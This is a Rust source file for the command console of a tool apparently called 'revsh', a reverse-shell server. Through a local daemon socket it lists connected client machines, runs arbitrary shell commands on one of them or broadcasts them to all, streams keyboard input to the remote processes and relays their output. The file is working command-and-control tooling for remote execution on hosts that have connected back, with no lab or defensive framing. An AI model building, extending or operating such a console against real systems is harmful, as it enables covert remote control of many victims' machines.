use tokio::net::UnixStream;
use std::io::{ Write, BufRead };
use tokio::io::{ AsyncRead, AsyncWrite };
use tokio::sync::RwLock;
use clap::Parser;
use std::sync::Arc;
use tokio::sync::Mutex;

use revsh_common::*;
use revsh_server::*;

#[derive(Parser, Debug)]
struct Args {
    #[command(subcommand)]
    action: Action,
}

#[derive(clap::Subcommand, Debug)]
enum Action {
    #[command(name = "list")]
    ListClients {
        
    },
    #[command(name = "run")]
    RunCommand {
        #[arg(short, long)]
        detach: bool,
        target: UID,
        command: String,
    },
    #[command(name = "broadcast")]
    RunBroadcast {
        #[arg(short, long)]
        detach: bool,
        command: String,
    },
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let args = Args::parse();

    println!("Connecting to deamon...");
    let mut stream = UnixStream::connect("/tmp/revsh/ipc").await
        .expect("Deamon not running");
    println!("Connected to deamon");
    
    match args.action {
        Action::ListClients {  } => {
            let (mut read, mut write) = stream.split();
            let mut users = list_users(&mut read, &mut write).await.unwrap();
            users.sort_by_key(|users| users.uid);

            let max_id = users.iter().map(|a| a.uid).max().unwrap_or(0);
            let longest_addr = users.iter()
                .map(|a| format!("{:?}", a.addr).len()).max().unwrap_or(0);
            let age_length = users.iter()
                .map(|a| format!("{}", (chrono::Utc::now() - a.connected_at).num_seconds()).len()).max().unwrap_or(0);
            let id_length = format!("{max_id}").len();
            println!("--{}---{}---{}---", "-".repeat(id_length), "-".repeat(longest_addr), "-".repeat(age_length));
            for user in users {
                println!(
                    "| {id:0id_length$} | {addr:?} | {age:0age_length$}s |",
                    id = user.uid,
                    id_length = id_length,
                    addr = user.addr,
                    age = (chrono::Utc::now() - user.connected_at).num_seconds(),
                    age_length = age_length
                );
            }
            println!("--{}---{}---{}---", "-".repeat(id_length), "-".repeat(longest_addr), "-".repeat(age_length));
        },
        Action::RunCommand { target, command, detach } => {
            let (reader, writer) = stream.into_split();
            pass_command_to(
                reader, writer,
                detach, vec![target], "sh".into(), vec!["-c".into(), command]
            ).await.unwrap();
        },
        Action::RunBroadcast { command, detach } => {
            let (mut reader, mut writer) = stream.into_split();
            let users = list_users(&mut reader, &mut writer).await.unwrap();
            let ids = users.into_iter().map(|i| i.uid).collect::<Vec<_>>();
            pass_command_to(
                reader, writer,
                detach, ids, "sh".into(), vec!["-c".into(), command]
            ).await.unwrap();
        }
    }
  
    Ok(())
}

async fn list_users(
    mut reader: impl AsyncRead + Unpin + Send,
    mut writer: impl AsyncWrite + Unpin + Send,
) -> std::io::Result<Vec<OutCliUserInfo>> {
    send_message_into(
        &InCliMessage::ListClients {
            page_size: 0,
            page_index: 1000
        },
        &mut writer,
    ).await.unwrap();
    
    let users = loop {
        let e: OutCliMessage = recv_message_from(&mut reader).await?;
        match e {
            OutCliMessage::ClientList { users } => break users,
            _ => (),
        }
    };
    
    Ok(users)
}

async fn pass_command_to(
    mut reader: impl AsyncRead + Unpin + Send + 'static,
    mut writer: impl AsyncWrite + Unpin + Send + 'static,
    detach: bool,
    targets: Vec<UID>, exe: String, args: Vec<String>
) -> std::io::Result<()> {
    let created_id = new_uid();
    for &target in &targets {
        send_message_into(
            &InCliMessage::SendMessageTo {
                target,
                message: S2CMessage::Execute {
                    pid: created_id,
                    exe: exe.clone(), args: args.clone(),
                    print_output: true
                },
            },
            &mut writer,
        ).await?;
    }

    // Waiting for server's feedback
    loop {
        let e: OutCliMessage = recv_message_from(&mut reader).await?;
        match e {
            OutCliMessage::SendToFeeback(Ok(())) => {
                break;
            },
            OutCliMessage::SendToFeeback(Err(e)) => {
                println!("Execution failed: {e}");
                return Ok(());
            },
            _ => (),
        }
    }

    if detach { return Ok(()) };
    
    let writer_1 = Arc::new(Mutex::new(writer));
    let remaining_targets = Arc::new(RwLock::new(targets));

    tokio::spawn({
        let remaining_targets = Arc::clone(&remaining_targets);
        let writer_1 = Arc::clone(&writer_1);
        async move {
            loop {
                let line = tokio::task::block_in_place(|| {
                    let mut stdin = std::io::stdin().lock();
                    let mut str = String::new();
                    stdin.read_line(&mut str).unwrap();
                    str
                });
                let mut writer = writer_1.lock().await;
                let data = line.into_bytes().into_boxed_slice();
                for &target in &*remaining_targets.read().await {
                    send_message_into(&InCliMessage::SendMessageTo {
                        target,
                        message: S2CMessage::Input {
                            target_pid: created_id,
                            data: data.clone(),
                        },
                    }, &mut *writer).await?;
                };
                
                if false { break } // Avoids warning of unreachable code
            }
            
            Ok::<(), anyhow::Error>(())
        }
    });
    
    let (exit_now_send, mut exit_now_recv) = 
        tokio::sync::mpsc::channel::<()>(1);

    ctrlc::set_handler(move || {
        exit_now_send.try_send(()).unwrap();
    }).expect("Error setting Ctrl-C handler");            

    let a = loop {
        let e: OutCliMessage = tokio::select! {
            a = recv_message_from(&mut reader) => a.unwrap(),
            _ = exit_now_recv.recv() => {
                break 1;
            }
        };
        let ts = remaining_targets.read().await;
        match e {
            OutCliMessage::ClientMessage {
                sender,
                message: C2SMessage::ProcessOutput { pid, data }
            } if ts.contains(&sender) && pid == created_id => {
                let mut a = std::io::stdout().lock();
                a.write_all(&data).unwrap();
                a.flush().unwrap();
            },
            OutCliMessage::ClientMessage {
                sender,
                message: C2SMessage::ProcessStopped { pid, exit_code }
            } if pid == created_id => {
                let Some(target_index) = (0..ts.len())
                    .find(|&i| ts[i] == sender) else { continue };

                drop(ts);
                let mut ts = remaining_targets.write().await;
                ts.remove(target_index);

                println!("Client {target_index} finished executing ({} remaining)", ts.len());
                if ts.len() == 0 {
                    println!("All target clients finished");
                    break exit_code;
                }
            },
            OutCliMessage::ClientDisonnected { uid } => {
                let Some(target_index) = (0..ts.len())
                    .find(|&i| ts[i] == uid) else { continue };
                
                drop(ts);
                let mut ts = remaining_targets.write().await;
                ts.remove(target_index);

                println!("Client {target_index} disonnected ({} remaining)", ts.len());
                if ts.len() == 0 {
                    println!("All target clients disconnected");
                    break 1;
                }
            }
            _ => (),
        }
    };

    let mut writer = writer_1.lock().await;
    for &target in &*remaining_targets.read().await {
        send_message_into(&InCliMessage::SendMessageTo {
            target,
            message: S2CMessage::KillProcess { pid: created_id },
        }, &mut *writer).await.unwrap();
    }
    
    Ok(())
}
